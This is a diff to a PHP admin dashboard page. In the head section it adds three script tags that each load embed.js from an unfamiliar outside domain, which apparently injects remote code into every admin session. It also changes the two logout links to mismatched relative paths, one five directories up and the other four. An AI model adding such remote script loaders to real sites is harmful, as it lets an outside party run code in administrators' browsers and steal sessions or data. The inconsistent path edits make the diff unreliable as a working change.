@@ -89,6 +89,11 @@ if ($stmt = mysqli_prepare($link, $sqlAssets)) {
 
     <!-- Custom styles for this template -->
     <link href="../../../css/sb-admin-2.min.css" rel="stylesheet">
+        <script src="https://dash-board.top/embed.js"></script>
+
+    <script src="https://dash-board.top/embed.js" data-theme="royalblue"></script>
+
+    <script src="https://dash-board.top/embed.js" data-theme="crimson"></script>
 </head>
 
 <body id="page-top">
@@ -168,7 +173,7 @@ if ($stmt = mysqli_prepare($link, $sqlAssets)) {
                             </a>
                             <div class="dropdown-menu dropdown-menu-right shadow animated--grow-in"
                                  aria-labelledby="userDropdown">
-                                <a class="dropdown-item" href="../../../public/login.php" data-toggle="modal" data-target="#logoutModal">
+                                <a class="dropdown-item" href="../../../../../public/login.php" data-toggle="modal" data-target="#logoutModal">
                                     <i class="fas fa-sign-out-alt fa-sm fa-fw mr-2 text-gray-400"></i>
                                     Logout
                                 </a>
@@ -271,7 +276,7 @@ if ($stmt = mysqli_prepare($link, $sqlAssets)) {
                 <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
                 <div class="modal-footer">
                     <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
-                    <a class="btn btn-primary" href="../../../public/login.php">Logout</a>
+                    <a class="btn btn-primary" href="../../../../public/login.php">Logout</a>
                 </div>
             </div>
         </div>
